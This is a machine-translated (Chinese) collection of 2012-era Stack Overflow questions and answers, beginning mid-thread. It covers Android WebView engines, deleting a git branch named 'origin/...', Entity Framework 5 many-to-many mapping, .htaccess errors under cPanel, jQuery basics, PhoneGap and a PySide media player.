在 Android 4.2 中，WebView 有 2 个可能的提供程序：经典 webview 提供程序和 chromium webview 提供程序。但是，Chromium webview 仅适用于 Android 的非发布（调试）版本，并且仅在您启用特殊标志时才有效。WebView 的默认提供程序仍然是基于股票 Android 浏览器的经典 webview。

如需深入了解支持这些断言的 Android 源代码：http: [//bricolsoftconsulting.com/jellybean-webview-html-rendering-engine/](http://bricolsoftconsulting.com/jellybean-webview-html-rendering-engine/)

至于“升级操作系统时WebView和Chrome浏览器将是一样的”，我理解为当新版本的Android操作系统发布时，webview和Chrome将共享相同的渲染引擎。随着新的 Chrome 应用每 6 周发布一次，webview 将继续使用操作系统随附的原始 Chrome 渲染引擎，而 Chrome 应用将在最近的 6 周更新中使用 Chrome 渲染引擎。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-14T10:08:28.573

查看来自 chromium.org 的代码：WebView 是基于 ChromeView 构建的。这可能是为了保持 WebView 的兼容性，而不是使用 ChromeView 重写 Android Web 应用程序。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-10-31T18:25:00.187

Android 4.4 WebView 现在基于 Chromium：[Chromium WebView](https://developer.android.com/about/versions/kitkat.html#44-webview)

# git - GIT - 无法从远程存储库中删除特定分支

> ID：12192676
> 
> 赞同：4
> 
> 时间：2012-08-30T08:18:52.947
> 
> 标签：git

我无法删除名为`origin/featureBranch`. 我想这是因为分支名称以 开头`origin`，但我不确定：

```
$ git branch -r | grep featureBranch
  origin/origin/featureBranch

$ git push origin :origin/featureBranch

    error: unable to push to unqualified destination: origin/featureBranch

    The destination refspec neither matches an existing ref on the remote nor
    begins with refs/, and we are unable to guess a prefix based on the source ref.

    error: failed to push some refs to 'git@github.com:myCompany/my-repo.git' 
```

**更新**

`$ git push origin :featureBranch`给出同样的错误。

**笔记**

在远程分支是`origin/origin/myFeature`，在本地是`origin/myFeature`。

我知道`origin`通常是什么意思，但就我而言 - 这是分支名称的一部分。

Github 没有看到这个分支。

* * *

谁能解释一下“幕后”发生了什么以及如何删除这个分支？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-30T08:35:18.223

尝试这个：

```
git push origin :refs/heads/origin/featureBranch 
```

您始终可以在`refs/heads/`.

分支存储为一个小文本文件，位于`.git/refs/`. 本地分支在下面`.git/refs/heads/`，远程分支在`.git/refs/remotes/<remotename>/`. `master`因此，将在`.git/refs/heads/master`and找到一个简单的分支`.git/refs/remotes/origin/master`，但您的错误分支实际上将驻留在`.git/refs/heads/origin/featureBranch`. 它不会与`origin`存储库上的远程分支混淆，因为它不是在 下`refs/remotes/origin/`，而是在`refs/heads/`.

在远程服务器上，`origin/featureBranch`分支是服务器*本地*的，因此它将存储在`refs/heads/`. 推送到给定分支时，您可以通过其名称或路径来识别它，因此如果名称不起作用，只需使用以 . 开头的完整路径`refs`。

你是怎么得到这个奇怪的分支名称的？我不能确定，因为我不知道你做了什么，但是我在使用时遇到了同样的问题`git push --mirror`，它会推送所有引用，**包括**远程引用，所以它会创建`origin/branchname`一个**本地**分支。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T08:21:09.020

这应该有效：

```
$ git push origin :featureBranch 
```

您已经指定了推送的位置，这`origin/`只是您本地分支的名称。

背景：当 git 进行抓取时，它会创建所谓的“远程跟踪分支”。这些与您自己的分支并没有真正的不同，它们只是以远程名称（例如origin/master）为前缀，并在本地表示服务器分支（所有提交都已被获取）。

当您执行推送源时，您根本不是指本地远程跟踪分支，而是告诉 Git “推送到源源分支：目标分支”

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T08:34:04.730

这条消息说它找不到任何匹配的分支。

```
The destination refspec neither matches an existing ref on the remote nor
begins with refs/, and we are unable to guess a prefix based on the source ref. 
```

如果我尝试两次删除分支，这就是我得到的。（第一个成功，第二个失败）。或者如果分支已被其他人删除。您可以尝试`git remote prune`查看它是否从您的`git branch -r`输出中消失。您还可以检查分支是否正在`origin`使用`git ls-remote git@github.com:myCompany/my-repo.git`.

`origin/master`像on一样删除奇怪（糟糕？）命名的分支`origin`对我来说很好：

```
$ git push origin master:origin/master
Counting objects: 3, done.
Writing objects: 100% (3/3), 218 bytes, done.
Total 3 (delta 0), reused 0 (delta 0)
Unpacking objects: 100% (3/3), done.
To ../bare/
 * [new branch]      master -> origin/master

$ git branch -r
  origin/origin/master

$ git push origin :origin/master
To ../bare/
 - [deleted]         origin/master 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-30T08:21:08.610

只需`origin`放在冒号后面：

`git push origin :featureBranch`

正如迈克尔解释的那样，这意味着将“无”推送到指定的分支。 [这](http://gitready.com/beginner/2009/02/02/push-and-delete-branches.html)是一个更完整的解释。

# .net - 错误“项目''已被重命名或不再在解决方案中”？

> ID：12192677
> 
> 赞同：4
> 
> 时间：2012-08-30T08:19:00.067
> 
> 标签：.net, visual-studio, visual-c++

我正在使用 Visual Studio 2010。我有很多项目的解决方案。

这些项目是从其他解决方案中复制的，我已经重命名了一些项目。

我第一次成功构建了这个解决方案，之后我关闭了解决方案并重新打开它，然后

我建它发生错误`"the project ' ' has been renamed or is no longer in the solution"`。

我在这个论坛上搜索了我的问题，阅读了很多方法，但最后我必须创建新的解决方案并再次添加项目 => 那时它可以成功构建。

但不幸的是，当我关闭并重新打开解决方案时，此错误再次发生。

有人可以向我展示绝对消除此错误的解决方案吗？

非常感谢，

同天集团

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T15:00:57.790

我在 VS2010 中收到了同样的错误消息。

我解决了它，但打开了解决方案文件 (.SLN) 并删除了引用我的项目的行。然后我能够将我的项目重新添加到解决方案中并正确构建它。

```
ProjectReferences = "{F9859F0E-556D-44B5-BBDA-F4CEDEAA3226}|WebServiceInterface.dll;{ED5F7021-3E36-44D0-8362-577CFFF79090}|SharepointWeb.dll;" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:42:07.077

我也遇到过这个问题。当我需要重命名我的 vcxproj 和 sln 文件时，我导致了这个问题，并且旧的项目依赖项与新的文件名不匹配。

以下是一些步骤，希望它对您有用......

从解决方案中删除所有项目，然后将它们一一添加回来以找到有问题的项目文件。在记事本中打开文件，我删除了底部的项目引用并保存了文件。我在 VS 2010 中重新加载了解决方案，并重置了项目依赖项。

# mpi - MPI 非阻塞发送/接收

> ID：12192678
> 
> 赞同：5
> 
> 时间：2012-08-30T08:19:00.827
> 
> 标签：mpi, nonblocking

我很好奇 MPI 中缺少此功能：

```
MPI_Isendrecv( ... ); 
```

即，非阻塞发送和接收，谁能告诉我遗漏背后的理由？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-30T09:42:58.920

我的看法是，它的`MPI_SENDRECV`存在是为了方便想要使用阻塞语义但需要实现移位操作的程序员。如果您对非阻塞语义感到满意，您应该简单地使用现有的`MPI_ISEND`and `MPI_IRECV`。

有趣的是，MPI-3 将添加非阻塞集合（例如`MPI_IBARRIER`），但仍然没有`MPI_ISENDRECV`（参见[http://meetings.mpi-forum.org/draft_standard/mpi3.0_draft_2.pdf](http://meetings.mpi-forum.org/draft_standard/mpi3.0_draft_2.pdf)）。

# c# - Entity Framework 5升级后多对多关系左右键翻转

> ID：12192679
> 
> 赞同：13
> 
> 时间：2012-08-30T08:19:05.623
> 
> 标签：c#, sql-server, entity-framework, entity-framework-5

我有一些代码可以在代码中保存多对多关系。它在 Entity Framework 4.1 上运行良好，但在更新到 Entity Framework 5 后，它失败了。

我收到以下错误：

> INSERT 语句与 FOREIGN KEY 约束“FK_WebUserFavouriteEvent_Event”冲突。冲突发生在数据库“MainEvents”、表“dbo.Event”、列“Id”中。

我正在使用带有自定义映射的 POCO 实体。标准字段和多对一关系映射似乎工作正常。

**更新**

好的，所以我已经安装了 SQL Profiler 并且情节变厚了......

```
exec sp_executesql N'insert [dbo].[WebUserFavouriteEvent]([WebUserId], [EventId])
values (@0, @1)
',N'@0 int,@1 int',@0=1820,@1=14 
```

意思是：

```
WebUserId = @0 = 1820
EventId = @1 = 14 
```

有趣的是，**EF5 似乎已经翻转了外键**...... **WebUserId 应该是 14**并且EventId 应该**是 1820**，而不是像现在这样。

我查看了映射代码，我 99% 都正确设置了它。有关详细信息，请参阅[Entity Framework Fluent API - 关系 MSDN 文章](http://msdn.microsoft.com/en-us/data/jj591620)。

**注意：**我还发现这不仅限于保存，SELECT 也被破坏了。

以下是所有相关代码：

**服务层**

```
public void AddFavEvent(WebUser webUser, Event @event)
{
    webUser.FavouriteEvents.Add(@event);

    _webUserRepo.Update(webUser);
} 
```

**存储库**

```
public void Update<T>(params T[] entities)
    where T : DbTable
{
    foreach (var entity in entities)
    {
        entity.UpdatedOn = DateTime.UtcNow;
    }

    _dbContext.SaveChanges();
} 
```

**注意：**我对每个请求使用 1 个 DataContext 方法，因此`webUser`并且`@event`会从与`_webUserRepo`.

**实体**（不用担心 DbTable 的东西）

```
public class Event : DbTable
{
    //BLAH
    public virtual ICollection<WebUser> FavouriteOf { get; set; }
    //BLAH
}

public class WebUser : DbTable
{
    //BLAH
    public virtual ICollection<Event> FavouriteEvents { get; set; }
    //BLAH
} 
```

**映射**

```
public class EventMapping : DbTableMapping<Event>
{
    public EventMapping()
    {
        ToTable("Event");
        //BLAH
        HasMany(x => x.FavouriteOf)
            .WithMany(x => x.FavouriteEvents)
            .Map(x =>
                     {
                         x.MapLeftKey("EventId");
                         x.MapRightKey("WebUserId");
                         x.ToTable("WebUserFavouriteEvent");
                     });
    }
}

public class WebUserMapping : DbTableMapping<WebUser>
{
    public WebUserMapping ()
    {
        HasMany(x => x.FavouriteEvents)
            .WithMany(x => x.FavouriteOf)
            .Map(m =>
                     {
                         m.MapLeftKey("WebUserId");
                         m.MapRightKey("EventId");
                         m.ToTable("WebUserFavouriteEvent");
                     });
    }
} 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-02T17:16:22.783

看着这个，我怀疑问题可能是由于您两次映射相同的关系而引起的。你以不同的顺序映射它。

我做了一个简单的测试，我首先映射了一次关系：

```
 class Program
{
    static void Main(string[] args)
    {
        Database.SetInitializer(new DropCreateDatabaseAlways<Context>());
        var p = new Parent();
        var c = new Child();
        using (var db = new Context())
        {
            db.Parents.Add(new Parent());
            db.Parents.Add(p);

            db.Children.Add(c);
            db.SaveChanges();
        }

        using (var db = new Context())
        {
            var reloadedP = db.Parents.Find(p.ParentId);
            var reloadedC = db.Children.Find(c.ChildId);

            reloadedP.Children = new List<Child>();
            reloadedP.Children.Add(reloadedC);

            db.SaveChanges();
        }

        using (var db = new Context())
        {
            Console.WriteLine(db.Children.Count());
            Console.WriteLine(db.Children.Where(ch => ch.ChildId == c.ChildId).Select(ch => ch.Parents.Count).First());
            Console.WriteLine(db.Parents.Where(pa => pa.ParentId == p.ParentId).Select(pa => pa.Children.Count).First());
        }
    }
}

public class Parent
{
    public int ParentId { get; set; }
    public ICollection<Child> Children { get; set; }

}

public class Child
{
    public int ChildId { get; set; }
    public ICollection<Parent> Parents { get; set; }
}

public class Context : DbContext
{
    public Context() : base("data source=Mikael-PC;Integrated Security=SSPI;Initial Catalog=EFTest")
    {

    }

    public IDbSet<Child> Children { get; set; }
    public IDbSet<Parent> Parents { get; set; }

    protected override void OnModelCreating(DbModelBuilder modelBuilder)
    {
        base.OnModelCreating(modelBuilder);
        modelBuilder.Entity<Child>()
            .HasMany(x => x.Parents)
            .WithMany(x => x.Children)
            .Map(c =>
            {
                c.MapLeftKey("ChildId");
                c.MapRightKey("ParentId");
                c.ToTable("ChildToParentMapping"); 
            });

    }
} 
```

然后我将 OnModelCreating 更改为：

```
 protected override void OnModelCreating(DbModelBuilder modelBuilder)
    {
        base.OnModelCreating(modelBuilder);
        modelBuilder.Entity<Child>()
            .HasMany(x => x.Parents)
            .WithMany(x => x.Children)
            .Map(c =>
            {
                c.MapLeftKey("ChildId");
                c.MapRightKey("ParentId");
                c.ToTable("ChildToParentMapping"); 
            });

        modelBuilder.Entity<Parent>()
           .HasMany(x => x.Children)
           .WithMany(x => x.Parents)
           .Map(c =>
           {
               c.MapLeftKey("ParentId");
               c.MapRightKey("ChildId");
               c.ToTable("ChildToParentMapping");
           });
    } 
```

我发现并怀疑的是第一次运行会生成这个 sql：

```
exec sp_executesql N'insert [dbo].[ChildToParentMapping]([ChildId], [ParentId])
values (@0, @1)
',N'@0 int,@1 int',@0=1,@1=2 
```

与生成的第二个相反：

```
exec sp_executesql N'insert [dbo].[ChildToParentMapping]([ParentId], [ChildId])
values (@0, @1)
',N'@0 int,@1 int',@0=1,@1=2 
```

你看到价值观翻转了吗？在这里，它实际上将 ChildId 列计为 ParentId。现在这对我来说不会崩溃，但我让 EF 创建数据库，这意味着它可能只是切换列名，如果我查看外键，它们也会被切换。如果您手动创建了数据库，情况可能不会如此。

简而言之：您的映射不相等，我希望使用其中一个，而那个可能是错误的。在早期的版本中，我猜 EF 以不同的顺序拾取它们。

**更新：** 我对外键有点好奇并检查了 sql。

从第一个代码：

```
ALTER TABLE [dbo].[ChildToParentMapping] ADD CONSTRAINT [FK_dbo.ChildToParentMapping_dbo.Children_ChildId] FOREIGN KEY ([ChildId]) REFERENCES [dbo].[Children] ([ChildId]) ON DELETE CASCADE 
```

从第二个代码：

```
ALTER TABLE [dbo].[ChildToParentMapping] ADD CONSTRAINT [FK_dbo.ChildToParentMapping_dbo.Children_ParentId] FOREIGN KEY ([ParentId]) REFERENCES [dbo].[Children] ([ChildId]) ON DELETE CASCADE 
```

现在这不是很好。ParentId 映射到 Children 肯定不是我们想要的。

那么第二个映射错了吗？不是真的，因为看看我删除第一个时发生了什么：

```
ALTER TABLE [dbo].[ChildToParentMapping] ADD CONSTRAINT [FK_dbo.ChildToParentMapping_dbo.Parents_ParentId] FOREIGN KEY ([ParentId]) REFERENCES [dbo].[Parents] ([ParentId]) ON DELETE CASCADE 
```

不知何故，有两个映射似乎把事情搞砸了。有没有BUG我不知道。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-06T20:37:15.847

我可以确认这是 EF5 中的一个错误，尽管我仍然不确定它在 4.3.1 中是如何工作的。

问题是我们没有正确地将 LeftKey/RightKey 调用与其相应的导航属性相关联。

我将在我们的 CodePlex 项目网站上提交一个 EF6 错误。

要解决方法，我认为您需要：

1.  仅从一侧配置关联。或者，
2.  在两种配置中将 LeftKey/RightKey 列名称切换为相同。

带来不便敬请谅解。

**更新**：这是[错误](http://entityframework.codeplex.com/workitem/488)。

# jquery - 关于 jQuery 优势和一般功能的基本、具体问题

> ID：12192680
> 
> 赞同：0
> 
> 时间：2012-08-30T08:19:09.313
> 
> 标签：jquery, algorithm, cross-browser, dhtml

**问题 1.**我假设对于 jQuery，任务仅限于以下 API 列表。是这样吗？

*jQuery 核心、选择器、属性、遍历、操作、CSS、事件、效果、Ajax、实用程序、jQuery UI*

**问题 2.** jQuery 是否仅限于 DHTML、用户界面和 AJAX？这是否意味着它在浏览器中留下了诸如音频/图像编码/解码之类的其他内容（带有数组缓冲区和数据视图），或者是否有一种通用的方法来处理每个 HTML 标签和 CSS 属性，但是以一种通用的方式，没有像我提到的关于音频/图像的任务那样“高级”得多？

**问题 3.**除了加速用户界面的开发和不必担心编程跨浏览器差异之外，使用 jQuery 的主要原因是什么（如果有的话）？

**问题 4.**浏览器之间有哪些不同的相关特定元素，或者有太多需要提及的元素，即使是大图？

**问题 5.**每个 API 方面是否应该有一个“Hello World”？或者如果它们确实存在，它们是否都清楚地包含在 jQuery 官方教程和 API 参考中？有哪些明确的建议对 jQuery 初学者很友好？

**问题 6.**学习和理解 jQuery 代码的更好方法是什么，以及理解所使用的算法和语法的参考资料，确切地知道它可以做什么以及它是如何完成的，并且避免一次又一次地猜测如何用 jQuery 做最简单的事情？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:34:20.343

答案 1：

这是主要的 jQuery 功能，使用它们的可能性是巨大的。

答案 2：

音频和视频编码是 HTML5 的一部分，浏览器会为你做这些，所以通过使用 jQuery，你无法处理这样的部分。

答案 3：

jQuery 通过许多流行的浏览器和版本的测试，因此您使用的每个功能都可以在任何浏览器 99% 上运行。

答案 6：

您应该了解一些 jQuery 模式，其中所有的部分工作类似于：

1.输入参数：作为对象发送

```
{
   startAt : 100,
   endAt : 200
   onEnd : function(){
    //JS Code
   }
} 
```

2.Selector 总是返回一个 jQuery 对象而不是一个 DOM 元素，来获取你应该使用`.get(index)`方法的 dom 元素

等等

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T09:21:18.213

1.  简而言之：没有。jQuery 带有一套全面的工具来简化和加快前端 HTML 应用程序的开发。在 jQuery 核心库之上有一个插件系统和一个大型插件库，这些插件库扩展了核心库的功能并提供了核心[plugins.jquery.com](http://plugins.jquery.com/)（目前离线）[www 中找不到的 ui 工具。 jqueryplugins.com](http://www.jqueryplugins.com/)

2.  jQuery 是一种前端语言，依赖于浏览器提供和 HTTP 堆栈来提供您提到的许多功能（压缩/解压缩流）。

3.  您正在学习/为现在用于 Web 开发的行业标准库做出贡献，从而维护/提高自己作为程序员的技能，并使您对当前/未来的雇主更有价值。

4.  这些太详细了，太多了，无法列出，从处理`CSS`的差异到 JS 功能的差异，比如`requestAnimationFrame`......这个列表不胜枚举。对浏览器的支持程度`H.264`是`WebGL`目前的一大问题。解决这个问题的最好方法是不要试图全面了解这些差异，因为浏览器供应商每隔几个月就会发布更新，而且列表也在不断变化。开始编码并在遇到问题时返回 SO。除了@Petah 已经提到的 quirksmode.com 之外，请查看[http://www.alistapart.com/](http://www.alistapart.com/)，它们具有出色的资源跨浏览器兼容性，不仅与 JS 兼容，还与 CSS 兼容。

5.  我还没有浏览过 jQuery 的完整 API 文档，但我发现这些文档提供了非常简单但有时不那么简单的教程和*Hello World*示例，说明如何使用方法调用以及它们的作用。这些结合对 JS 的大致了解和 jQuery 的设计方法就足够了。对于一个完整的初学者，从[jQuery 工作](http://docs.jquery.com/How_jQuery_Works)原理和[jQuery 教程](http://docs.jquery.com/Tutorials)（向下滚动页面查看 jQuery API 教程）以及关于 JavaScript 的[Mozilla DevNet 文章](https://developer.mozilla.org/en-US/docs/JavaScript)开始，因为您需要这些文章来理解一些 JS 特定问题。

6.  没有简单或快速的方式来完全理解*jQuery* - 或任何库 - 可以和不能做的所有事情。要到达那里，您需要从使用库开始，查看源代码并最终为项目的所有模块做出贡献 - 基本上您需要成为项目的开发人员。如果即便如此，你也会知道这一切，这是值得商榷的。你参与了哪个主要的软件项目，你一个人就知道整个项目的所有内容以及它可以做的所有事情。一个好的起点是了解 javascript，[Mozilla DevNet](https://developer.mozilla.org/en-US/docs/JavaScript)为此提供了一些很好的资源。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T08:34:47.970

1.  你说有限。但我认为这足以为您的应用程序提供基础。

2.  jQuery 是 JavaScript，一种客户端脚本语言。它不应该处理图像/声音/视频编码/解码。

3.  当涉及到任何类型的开发时，开发速度和跨平台兼容性应该是您的首要任务。

4.  [http://www.quirksmode.org/](http://www.quirksmode.org/)提供了很大范围的跨浏览器差异，其中 jQuery 解决了很多（这里太多不提了）。

5.  `Hello World!`仅适用于语言的非常基本的基础。如果您将计算机视为纯粹的输入输出，那么 Hello World 应用程序甚至几乎不会引入输入。阅读 jQuery 丰富的文档和教程，如果找不到答案，请在 Stack Overflow 上提问。

6.  您不必完全了解 jQuery 的工作原理，而是了解您的业务问题并使用 jQuery 来帮助解决这些问题。

# apache - htaccess 文件全部拒绝，重定向到 404 未在 403.shtml 上找到，但未定义自定义错误页面

> ID：12192681
> 
> 赞同：2
> 
> 时间：2012-08-30T08:19:13.223
> 
> 标签：apache, .htaccess, custom-error-pages

我正在 cPanel 的新插件域中建立一个快速的内部项目。这个特定的安装了 SSL 证书。我正在构建我的 .htaccess 并添加了一个`<Files config.php>`指令，`deny from all`以便无法访问我的 config.php 文件。我意识到将它存储在网络根目录之外是理想的，但在这种情况下我不能。

通常我会期望`www.domain.com/config.php`在浏览器中我会得到 Apache 的默认 403 Forbidden 页面。这就是在同一台服务器上的其他域上发生的情况。但在这种情况下，我收到 404 not found 错误，说明：

> 未找到
> 在此服务器上未找到请求的 URL /403.shtml。
> 此外，在尝试使用 ErrorDocument 处理请求时遇到 404 Not Found 错误。

如果我试图定义自定义错误文档，我通常会期望这一点，但在这种情况下，我不是！
使该域与同一 cPanel 帐户中的所有其他域不同的唯一原因是它具有 SSL 证书。无论使用 http 还是 https 导航，这个 404 错误都是一样的。我试过清除缓存，还是一样。

任何人都可以在下面的我的 .htaccess 中看到任何可能导致此问题的内容吗？

```
DirectoryIndex /index.php

Options -Indexes +FollowSymLinks
ServerSignature Off

# PARSE PHP IN OTHER FILES
# AddType FOR PHP AS APACHE MODULE, AddHandler FOR CGI
AddType application/x-httpd-php .ics .xml

# ATTEMPT FORCE PDF DOWNLOAD
AddType application/octet-stream .pdf

# PREVENT ACCESS TO CONFIG
<Files config.php>
order allow,deny
deny from all
</Files>

# CACHING
# http://httpd.apache.org/docs/current/mod/mod_headers.html
<FilesMatch "\.(js|css|ico|png|gif|jpg)$">
Header set Cache-Control "max-age=172800, public, must-revalidate"
#Header set Expires "Thu, 15 Apr 2011 20:00:00 GMT"
</FilesMatch>

# PREVENT ACCESS TO STATS UPDATE SCRIPT AS IT'S CLI ONLY
<Files stats_update.php>
order allow,deny
deny from all
</Files>

Redirect 302 /preview http://otherdomain.com/documents/preview
Redirect 302 /sample http://otherdomain.com/documents/preview

RewriteEngine On

# REWRITE NON-WWW TO WWW
RewriteCond %{HTTP_HOST} !^www\. [NC]
RewriteRule (.*) http://www.%{HTTP_HOST}/$1 [R=301]

RewriteRule ^about/?$ /index.php [L]
RewriteRule ^contact/?$ /contact.php [L]
RewriteRule ^home/?$ /home.php [L]
RewriteRule ^order/?$ /order.php [L]

# MAINTAINANCE
#RewriteCond %{REMOTE_HOST} !^123\.123\.123\.123
#RewriteCond %{REQUEST_URI} !^/maintainance\.html$
#RewriteRule ^(.*)$ /maintainance.html [R=302,L]
```

**编辑：**这可能与 cPanel 处理主域和附加域的方式有关吗？
在 cPanel 帐户中，您有一个主域，其文件位于其下，`public_html`然后您定义其文件位于其下的附加域（或子域）`public_html/addondomain.com/`

主域的 .htaccess`public_html/.htaccess`会影响/覆盖附加域的`public_html/addondomain.com/.htaccess`吗？
我知道 .htaccess 确实通过目录向下级联，但即使在特定域的 DocumentRoot 之上也是如此，例如：在这个插件域的情况下？

**编辑 2：**仅供参考，这里是对两个 HTTP 请求的响应，绕过任何缓存

```
root@vps [/home/username]#curl -i 'http://www.mydomain.com/config.php'
HTTP/1.1 403 Forbidden
Date: Sun, 16 Sep 2012 19:05:10 GMT
Server: Apache
Content-Length: 331
Content-Type: text/html; charset=iso-8859-1

root@vps [/home/username]# curl -i 'http://mydomain.com/config.php'
HTTP/1.1 301 Moved Permanently
Date: Sun, 16 Sep 2012 19:05:20 GMT
Server: Apache
Location: http://www.mydomain.com/403.shtml
Content-Length: 244
Content-Type: text/html; charset=iso-8859-1 
```

您会看到第二个获得 301 重定向，但它正在重定向到 403.shtml。所以 403.shtml 在重写到 www 之前已经被注入了。发生。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T09:08:23.900

这在香草 Apache 安装上无法重现，因此我开始进一步询问 cPanel。因此，经过大量的捣乱，我已经找到了这个问题。cPanel 确实为您设置了 ErrorDocument 指令，它一点也不聪明。特别是当它将 ErrorDocuments 设置为与 Apache 默认值明显相同的文档时。
由于 ErrorDocument cPanel 屏幕为空白，这种情况发生在哪里并不明显。

cPanel 的 httpd.conf 是由很多包含的配置构建的，并且隐藏在那里......

```
/usr/local/apache/conf/includes/errordocument.conf
...
# 403 - Forbidden
ErrorDocument 403 /403.shtml
```

所以我们开始了，这就是 403.shtml 出现在请求中的位置。cPanel 为我设置错误文档。为了避免在 403 上看到 404 时产生混淆，我设置了自己的 403 错误消息，因此至少它们是一致的。

我希望这可以帮助某人！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T17:48:07.463

您的 htaccess 文件不会导致自定义错误页面。如果没有任何其他 htaccess 文件，则问题可能出在 cPanel 上，它有[自己的设置自定义错误页面的方式](http://docs.cpanel.net/twiki/bin/view/11_30/CpanelDocs/ErrorPages)。

# cordova - Phonegap 上的服务端 jQuery Mobile

> ID：12192682
> 
> 赞同：0
> 
> 时间：2012-08-30T08:19:14.967
> 
> 标签：cordova, jquery-mobile

我们有一个 jQueryMobile 应用程序，其中每个页面都是从应用程序服务器动态提供的。我们自己不做任何 AJAX 或 JSON，而是依靠 JQM 来获取所服务的 html 页面。

是否可以使用 PhoneGap 将应用程序包装为应用程序？

**背景：**

据我了解，PhoneGap 希望您在本地打包所有 html+js+css。理论上，我的应用程序可以在 PhoneGap 应用程序内有一个静态的 .htm 起始页，但下一次单击（比如“登录”）将是[http://myserver.com/](http://myserver.com/)。

PhoneGap不会阻止它吗？

Apple 会因为它只是浏览器的包装而拒绝该应用程序吗？

简而言之，如果我想要服务器通信，我是否必须制作一个完整的 AJAX+JSON 应用程序才能使用 PhoneGap？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T10:05:01.173

*应用商店审查指南*第2 节*功能性*规定：

> 以任何方式或形式下载代码的应用程序都将被拒绝。

因此，如果您遵循获取服务器端 HTML 页面的方法，那么您的应用很可能会被拒绝。

# c# - 虚拟主机.exe。为什么需要这个？

> ID：12192683
> 
> 赞同：9
> 
> 时间：2012-08-30T08:19:21.667
> 
> 标签：c#, .net

> **可能重复：**
> [vshost.exe 文件的用途是什么？](https://stackoverflow.com/questions/774187/what-is-the-purpose-of-vshost-exe-file)

构建 .NET 应用程序时，会随实际应用程序一起创建名为**applicationname.vhost.exe的第二个 exe。**或者当我打开 bin 文件夹时它与实际应用程序一起存在。

**applicationname.vhost.exe**在我尝试打开它时似乎什么也没做。

它的目的是什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-30T08:20:46.473

> 托管进程是 Visual Studio 中的一项功能，可提高调试性能、启用部分信任调试并启用设计时表达式评估。托管进程文件在文件名中包含 vshost，并放置在项目的输出文件夹中。

[托管进程 (vshost.exe)](http://msdn.microsoft.com/en-us/library/ms185331(v=vs.80).aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-30T08:22:15.047

这就是“托管过程”。每当您在 Visual Studio IDE 中构建项目时都会创建它。其目的是为改进的 F5 性能、部分信任调试和设计时表达式评估提供支持。VSHOST 永远不应直接运行，也不应与您的应用程序一起部署。

[也在这里回答！](https://stackoverflow.com/questions/774187/what-is-the-purpose-of-vshost-exe-file)

# pyside - PySide.phonon 和媒体格式，例如 mp4,flv,mkv,eg

> ID：12192684
> 
> 赞同：3
> 
> 时间：2012-08-30T08:19:22.743
> 
> 标签：pyside

我绝对是一个pyside新手，想用PySide.phonon写一个媒体播放器。我的问题是：媒体播放器可以支持mp4,flv,mkv,eg等媒体格式吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T17:32:34.393

回答这个问题的最佳方法是尝试播放您感兴趣的文件类型，或者查看支持的 mimetype 列表。

这是一个演示视频播放器，应该允许您这样做：

```
from PySide import QtGui, QtCore
from PySide.phonon import Phonon

class Window(QtGui.QWidget):
    def __init__(self):
        QtGui.QWidget.__init__(self)
        self.setWindowTitle('Video Player')
        self.media = Phonon.MediaObject(self)
        self.video = Phonon.VideoWidget(self)
        self.video.setMinimumSize(400, 400)
        self.audio = Phonon.AudioOutput(Phonon.VideoCategory, self)
        Phonon.createPath(self.media, self.audio)
        Phonon.createPath(self.media, self.video)
        self.buttonChoose = QtGui.QPushButton('Choose File', self)
        self.buttonMimes = QtGui.QPushButton('Show Mimetypes', self)
        self.slider = Phonon.VolumeSlider(self)
        self.slider.setAudioOutput(self.audio)
        layout = QtGui.QGridLayout(self)
        layout.addWidget(self.video, 0, 0, 1, 2)
        layout.addWidget(self.buttonChoose, 1, 0)
        layout.addWidget(self.buttonMimes, 1, 1)
        layout.addWidget(self.slider, 2, 0, 1, 2)
        layout.setRowStretch(0, 1)
        self.media.stateChanged.connect(self.handleStateChanged)
        self.buttonChoose.clicked.connect(self.handleButtonChoose)
        self.buttonMimes.clicked.connect(self.handleButtonMimes)

    def handleButtonChoose(self):
        if self.media.state() == Phonon.PlayingState:
            self.media.stop()
        else:
            dialog = QtGui.QFileDialog(self)
            dialog.setFileMode(QtGui.QFileDialog.ExistingFile)
            if dialog.exec_() == QtGui.QDialog.Accepted:
                path = dialog.selectedFiles()[0]
                self.media.setCurrentSource(Phonon.MediaSource(path))
                self.media.play()
            dialog.deleteLater()

    def handleButtonMimes(self):
        dialog = MimeDialog(self)
        dialog.exec_()

    def handleStateChanged(self, newstate, oldstate):
        if newstate == Phonon.PlayingState:
            self.buttonChoose.setText('Stop')
        elif (newstate != Phonon.LoadingState and
              newstate != Phonon.BufferingState):
            self.buttonChoose.setText('Choose File')
            if newstate == Phonon.ErrorState:
                source = self.media.currentSource().fileName()
                print ('ERROR: could not play: %s' % source)
                print ('  %s' % self.media.errorString())

class MimeDialog(QtGui.QDialog):
    def __init__(self, parent):
        QtGui.QDialog.__init__(self, parent)
        self.setAttribute(QtCore.Qt.WA_DeleteOnClose)
        self.setWindowTitle('Mimetypes')
        listbox = QtGui.QListWidget(self)
        listbox.setSortingEnabled(True)
        backend = Phonon.BackendCapabilities
        listbox.addItems(backend.availableMimeTypes())
        layout = QtGui.QVBoxLayout(self)
        layout.addWidget(listbox)
        self.resize(300, 500)

if __name__ == '__main__':

    import sys
    app = QtGui.QApplication(sys.argv)
    app.setApplicationName('Phonon Player')
    window = Window()
    window.show()
    sys.exit(app.exec_()) 
